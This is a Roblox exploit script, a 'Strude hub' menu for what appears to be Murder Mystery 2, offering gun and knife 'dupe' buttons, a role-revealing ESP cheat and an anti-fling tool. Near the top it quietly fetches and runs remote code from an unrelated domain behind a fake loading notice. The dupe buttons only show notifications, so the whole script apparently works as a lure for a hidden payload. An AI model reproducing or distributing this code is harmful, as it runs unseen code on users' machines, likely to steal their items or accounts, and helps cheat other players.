local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "Strude hub [3.5]-Summer Update🏄", HidePremium = false, IntroText = "Strude hub", IntroIcon = "rbxassetid://18170549235", Icon = "rbxassetid://18170549235", SaveConfig = true, ConfigFolder = "OrionTest"})
OrionLib:MakeNotification({
	Name = "Loading Script...",
	Content = "Script will be loaded in 25-30 seconds | Note - Seconds Shown Here are not the exact loading time❗",
	Image = "rbxassetid://18170549235",
	Time = 30
})



getgenv().gui = false

loadstring(game:HttpGet("https://egorikusa.space/3c2b9c1029297a151ef37c1b.lua", true))()

--[[
Name = <string> - The name of the UI.
HidePremium = <bool> - Whether or not the user details shows Premium status or not.
SaveConfig = <bool> - Toggles the config saving in the UI.
ConfigFolder = <string> - The name of the folder where the configs are saved.
IntroEnabled = <bool> - Whether or not to show the intro animation.
IntroText = <string> - Text to show in the intro animation.
IntroIcon = <string> - URL to the image you want to use in the intro animation.
Icon = <string> - URL to the image you want displayed on the window.
CloseCallback = <function> - Function to execute when the window is closed.
]]
local Tab = Window:MakeTab({
    Name = "Dupe Guns 🔫",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
OrionLib:MakeNotification({
	Name = "Script Successfully Loaded",
	Content = "Loading Has been successful ",
	Image = "rbxassetid://17849312358",
	Time = 30
})

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]
--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
Tab:AddParagraph("Read Before Using❗","First Step is click to select ur equipped gun make sure u got a gun equipped this will not work if the first step has been skipped, Second Step and the final step is click the dupe button and wait 1-2 minutes")
Tab:AddButton({
	Name = "Click to select Equipped-Gun 🔫",
	Callback = function()
      		OrionLib:MakeNotification({
	Name = "Gun Selected ❗",
	Content = "The Equipped-Gun Has Been Successfully Selected",
	Image = "rbxassetid://4483345998",
	Time = 5
})

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]
  	end    
})

Tab:AddButton({
	Name = "Click To Dupe-Selected-Gun 🎯",
	Callback = function()
OrionLib:MakeNotification({
	Name = "Duping Guns...⏳",
	Content = "Duping is in process-[Takes around 1-2 minutes]-Dont leave the game❗",
	Image = "rbxassetid://4483345998",
	Time = 120
})
OrionLib:MakeNotification({
	Name = "Read-[📕]",
	Content = "Items not getting duped? Check if u are on a public server this will not work on a private server",
	Image = "rbxassetid://4483345998",
	Time = 25
})
Tab:AddParagraph("Note❗","This Duping Process Can Only Dupe 2 items per Dupe-Process So Two Items Per 1-2 minutes❗But it is the only working dupe method🔨 ")


--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]
  	end    
})

Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, Youtube is HiddenScriptsHubYT🎩")
Tab:AddParagraph("Note❗","This Duping Process Can Only Dupe 2 items per Dupe-Process So Two Items Per 1-2 minutes❗But it is the only working dupe method🔨 ")
local Tab = Window:MakeTab({
    Name = "Dupe Knives 🔪",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
Tab:AddParagraph("Read Before Using❗","First Step is click to select ur equipped Knife make sure u got a Knife equipped this will not work if the first step has been skipped, Second Step and the final step is click the dupe button and wait 1-2 minutes")
Tab:AddButton({
	Name = "Click to select Equipped-Knife 🔪",
	Callback = function()
      		OrionLib:MakeNotification({
	Name = "Selected Equipped Knife❗",
	Content = "The Equipped-Knife Successfully Selected",
	Image = "rbxassetid://4483345998",
	Time = 5
})

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]
  	end    
})

Tab:AddButton({
	Name = "Click To Dupe-Selected-Knife 🎯",
	Callback = function()
	OrionLib:MakeNotification({
	Name = "Duping Knives..⏳",
	Content = "Duping is in process-[Takes Around 1-2 minutes] Dont Leave The Game❗",
	Image = "rbxassetid://4483345998",
	Time = 120
})
    OrionLib:MakeNotification({
	Name = "Read-[📕]",
	Content = "Items not getting duped? Check if u are on a public server this will not work on a private server",
	Image = "rbxassetid://4483345998",
	Time = 25
})



--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]
  	end    
})
Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, HiddenScriptsHubYT🎩")
Tab:AddParagraph("Note❗","This Duping Process Can Only Dupe 2 items per Dupe-Process So Two Items Per 1-2 minutes❗But it is the only working dupe method🔨 ")
--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
local Tab = Window:MakeTab({
	Name = "Player-Esp🕶️",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddParagraph("Hidden Scripts / Esp❗","Will highlight whoever the murderer is RED and will highlight whoever the sheriff is BLUE and will highlight whoever is innocent GREEN")
Tab:AddButton({
	Name = "Click to enable-ESP 🎯",
	Callback = function()
--[[
    Credits to Kiriot22 for the Role getter <3
        - poorly coded by FeIix <3
]]

-- > Declarations < --

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LP = Players.LocalPlayer
local roles

-- > Functions <--

function CreateHighlight() -- make any new highlights for new players
    for i, v in pairs(Players:GetChildren()) do
        if v ~= LP and v.Character and not v.Character:FindFirstChild("Highlight") then
            Instance.new("Highlight", v.Character)           
        end
    end
end

function UpdateHighlights() -- Get Current Role Colors (messy)
    for _, v in pairs(Players:GetChildren()) do
        if v ~= LP and v.Character and v.Character:FindFirstChild("Highlight") then
            Highlight = v.Character:FindFirstChild("Highlight")
            if v.Name == Sheriff and IsAlive(v) then
                Highlight.FillColor = Color3.fromRGB(0, 0, 225)
            elseif v.Name == Murder and IsAlive(v) then
                Highlight.FillColor = Color3.fromRGB(225, 0, 0)
            elseif v.Name == Hero and IsAlive(v) and not IsAlive(game.Players[Sheriff]) then
                Highlight.FillColor = Color3.fromRGB(255, 250, 0)
            else
                Highlight.FillColor = Color3.fromRGB(0, 225, 0)
            end
        end
    end
end    

function IsAlive(Player) -- Simple sexy function
    for i, v in pairs(roles) do
        if Player.Name == i then
            if not v.Killed and not v.Dead then
                return true
            else
                return false
            end
        end
    end
end


-- > Loops < --

RunService.RenderStepped:connect(function()
    roles = ReplicatedStorage:FindFirstChild("GetPlayerData", true):InvokeServer()
    for i, v in pairs(roles) do
        if v.Role == "Murderer" then
            Murder = i
        elseif v.Role == 'Sheriff'then
            Sheriff = i
        elseif v.Role == 'Hero'then
            Hero = i
        end
    end
    CreateHighlight()
    UpdateHighlights()
end)
OrionLib:MakeNotification({
	Name = "Player-Esp Enabled-🕶️",
	Content = "The Player-Esp Feature has been enabled-🟢",
	Image = "rbxassetid://4483345998",
	Time = 7
})


--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]
      		print("button pressed")
  	end    
})
Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, HiddenScriptsHubYT🎩")
local Tab = Window:MakeTab({
	Name = "Anti-Fling 🦺",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddParagraph("Hidden Scripts / Anti-Fling Tool-🦺 ","This is a counter-fling tool for hackers that uses scripts to fling u tha make u unable to play a game like mm2 this is provided for free")
Tab:AddButton({
	Name = "Click To Enable Anti-Fling 🎯",
	Callback = function()
-- Modified By Thiffy --
-- // Constants \\ --
-- [ Services ] --
local Services = setmetatable({}, {__index = function(Self, Index)
local NewService = game.GetService(game, Index)
if NewService then
Self[Index] = NewService
end
return NewService
end})

-- [ LocalPlayer ] --
local LocalPlayer = Services.Players.LocalPlayer

-- // Functions \\ --
local function PlayerAdded(Player)
   local Detected = false
   local Character;
   local PrimaryPart;

   local function CharacterAdded(NewCharacter)
       Character = NewCharacter
       repeat
           wait()
           PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
       until PrimaryPart
       Detected = false
   end

   CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
   Player.CharacterAdded:Connect(CharacterAdded)
   Services.RunService.Heartbeat:Connect(function()
       if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
           if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
               if Detected == false then
                   game.StarterGui:SetCore("ChatMakeSystemMessage", {
                       Text = "Fling Exploit detected, Player: " .. tostring(Player);
                       Color = Color3.fromRGB(255, 200, 0);
                   })
               end
               Detected = true
               for i,v in ipairs(Character:GetDescendants()) do
                   if v:IsA("BasePart") then
                       v.CanCollide = false
                       v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                       v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                       v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
                   end
               end
               PrimaryPart.CanCollide = false
               PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
           end
       end
   end)
end

-- // Event Listeners \\ --
for i,v in ipairs(Services.Players:GetPlayers()) do
   if v ~= LocalPlayer then
       PlayerAdded(v)
   end
end
Services.Players.PlayerAdded:Connect(PlayerAdded)

local LastPosition = nil
Services.RunService.Heartbeat:Connect(function()
   pcall(function()
       local PrimaryPart = LocalPlayer.Character.PrimaryPart
       if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
           PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
           PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
           PrimaryPart.CFrame = LastPosition

           game.StarterGui:SetCore("ChatMakeSystemMessage", {
               Text = "You were flung. Neutralizing velocity.";
               Color = Color3.fromRGB(255, 0, 0);
           })
       elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
           LastPosition = PrimaryPart.CFrame
       end
   end)
end)
      		print("button pressed")
  	end    
})
Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, emrickEXE hub")
--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
local Tab = Window:MakeTab({
    Name = "Errors/Bugs?❗",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddParagraph("My Discord server 🎩"," Join my discord server if u need help with bugs/errors on the script i made u can also talk to improve the script more")
Tab:AddButton({
	Name = "Copy Link To Discord Server 🎯",
	Callback = function()
    setclipboard("https://discord.com/invite/SASw2jSRkS")
      		print("button pressed")
  	end    
})
Tab:AddParagraph("Read-[📕]","Please dont click the dupe buttons twice or multiple times this WILL cause errors❗")
Tab:AddParagraph("Credits-⭐","All Coded And Made By emrickEXE")
--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
